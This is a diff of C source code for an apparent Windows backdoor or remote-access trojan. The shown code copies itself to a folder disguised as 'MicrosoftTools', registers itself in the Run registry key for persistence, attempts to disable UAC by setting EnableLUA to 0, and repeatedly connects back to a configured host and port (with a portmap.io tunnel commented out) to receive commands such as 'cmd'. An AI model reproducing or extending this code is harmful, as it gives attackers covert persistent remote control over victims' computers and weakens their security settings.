@@ -1,34 +1,33 @@
 #include <stdio.h>
-#include <dirent.h>
-#include <locale.h>
 #include <windows.h>
+#include <Lmcons.h>
 #include "EA_Socket.h"
 #include "process.h"
 
-int port = 1111;
-char host[] = "www.sample.com";
+int port = 5005;//54977;
+char host[] = "127.0.0.1";//fbf-54977.portmap.io";
 char lastFolderName[60] = "MicrosoftTools";
 
 static void defect(void);
 static void lifeOnSystem(void);
 static void onlyRunCommand(char * cmd);
 static void readHostAndPortFromFile(void);
-static int process(SOCKET sckt, char * al);
+static int process(int sckt, char * al);
 
 int main()	// gcc --machine-windows
 {
 	WSADATA _wsdata;
+
+	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
+	{
+		Sleep(500);
+	}
 
 	//setlocale(LC_ALL, "Turkish");
 
 	//TODO: ByPass UAC
 
 	defect();
-
-	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
-	{
-		Sleep(500);
-	}
 
 	lifeOnSystem();
 	
@@ -39,71 +38,97 @@ int main()	// gcc --machine-windows
 
 static void defect(void)
 {
-	int i;
-	DIR * dir;
-	char targetPath[100] = {0};
+	// Get username
+	char username[UNLEN+1] = {0};
+	DWORD len = sizeof(username);
+	GetUserNameA(username, &len);
+
+	// Get path and program name
+	char * progName;
 	char srcPathwithName[MAX_PATH + 1] = {0};
+	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
+	size_t i = strlen(srcPathwithName);
+	while(srcPathwithName[i - 1] != '\\') i--;
+	progName = srcPathwithName + i;
 
-	GetModuleFileNameA(NULL, (TCHAR *)srcPathwithName, MAX_PATH + 1);
-	i = strlen(srcPathwithName);
-	while(srcPathwithName[--i] != '\\');
+	// Create target path
+	char targetPath[MAX_PATH + 1] = {0};
 
-	sprintf(targetPath, "C:\\Users\\%s\\AppData\\Local\\%s", getenv("USERNAME"), lastFolderName);
-	dir = opendir(targetPath);
+	strcpy(targetPath, "C:\\Users\\");
+	strcat(targetPath, username);
+	strcat(targetPath, "\\AppData\\Local\\");
+	strcat(targetPath, lastFolderName);
 
-	if (dir)
+	DWORD dwAttr = GetFileAttributesA(targetPath);
+
+	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
 	{
-		if (strncmp(srcPathwithName + i - strlen(lastFolderName), lastFolderName, strlen(lastFolderName)) != 0)
+		int len = strlen(lastFolderName);
+
+		if (i < len || strncmp(srcPathwithName + i - 1 - len, lastFolderName, len) != 0)
 		{
-			closedir(dir);
 			exit(0);
 		}
-		closedir(dir);
-	} else {
-		char command[400] = {0};
-
-		sprintf(command, "/c mkdir %s", targetPath);
-		onlyRunCommand(command);
-
-		sprintf(command, "/c copy %s %s\\%s", srcPathwithName, targetPath, srcPathwithName + i + 1);
-		onlyRunCommand(command);
-
-		sprintf(command, "%s\\%s", targetPath, srcPathwithName + i + 1);
-
-		HKEY hKey;
-		char * czStartName = srcPathwithName + i + 1;
-		char * czExePath   = command;
-
-		LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-
-		if(ERROR_SUCCESS == lnRes)
-		{
-			lnRes = RegSetValueExA(hKey, czStartName, 0, REG_SZ, (unsigned char *)czExePath, strlen(czExePath));
-		}
-
-		RegCloseKey(hKey);
-
-		DWORD number = 0x00000000;
-		lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
-		// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
-		if(ERROR_SUCCESS == lnRes)
-		{
-			lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (unsigned char *)&number, sizeof(DWORD));
-		}
-
-		RegCloseKey(hKey);
-
-		sprintf(command, "/c start %s\\%s", targetPath, srcPathwithName + i + 1);
-		onlyRunCommand(command);
-
-		exit(0);
+		return;
 	}
+
+	char command[400] = {0};
+
+	strcpy(command, "/c mkdir ");
+	strcat(command, targetPath);
+	onlyRunCommand(command);
+
+	ZeroMemory(command, 400);
+	strcpy(command, "/c copy ");
+	strcat(command, srcPathwithName);
+	strcat(command, " ");
+	strcat(command, targetPath);
+	strcat(command, "\\");
+	strcat(command, progName);
+	onlyRunCommand(command);
+
+	ZeroMemory(command, 400);
+	strcpy(command, targetPath);
+	strcat(command, "\\");
+	strcat(command, progName);
+
+	HKEY hKey;
+	char * czStartName = progName;
+	char * czExePath   = command;
+
+	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+
+	if(ERROR_SUCCESS == lnRes)
+	{
+		lnRes = RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE * )czExePath, strlen(czExePath));
+	}
+
+	RegCloseKey(hKey);
+
+	DWORD number = 0;
+	lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
+	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
+	if(ERROR_SUCCESS == lnRes)
+	{
+		lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&number, sizeof(DWORD));
+	}
+
+	RegCloseKey(hKey);
+
+	ZeroMemory(command, 400);
+	strcpy(command, "/c start ");
+	strcat(command, targetPath);
+	strcat(command, "\\");
+	strcat(command, progName);
+	onlyRunCommand(command);
+
+	exit(0);
 }
 
 static void lifeOnSystem(void)
 {
 	char * al;
-	SOCKET sckt;
+	int sckt;
     struct hostent * he;
 	int de, check = 0, yes = 1;
 	struct sockaddr_in veriler;
@@ -113,7 +138,7 @@ static void lifeOnSystem(void)
 
 	while((he = gethostbyname(host)) == NULL)
 	{
-		Sleep(500);
+		Sleep(1000);
 	}
 
 	addr_list = (struct in_addr **)he->h_addr_list;
@@ -121,19 +146,19 @@ static void lifeOnSystem(void)
 	while (1)
 	{
 		sckt = socket(AF_INET, SOCK_STREAM, 0);
-		setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));
 
-
-		veriler.sin_family = AF_INET;
-		veriler.sin_port = htons(port);
-		veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
-		memset(veriler.sin_zero, 0, 8);
-
-		if (sckt != INVALID_SOCKET && sckt != SOCKET_ERROR)
+		if (sckt != SOCKET_ERROR)
 		{
+			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));
+
+			veriler.sin_family = AF_INET;
+			veriler.sin_port = htons(port);
+			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
+			memset(veriler.sin_zero, 0, 8);
+
 			while (1)
 			{
-				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) == -1)
+				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) != SOCKET_ERROR)
 				{
 					break;
 				}
@@ -206,7 +231,7 @@ static void readHostAndPortFromFile(void)
 	}
 }
 
-static int process(SOCKET sckt, char * al)
+static int process(int sckt, char * al)
 {
 	if (strcmp(al, "cmd") == 0)
 	{
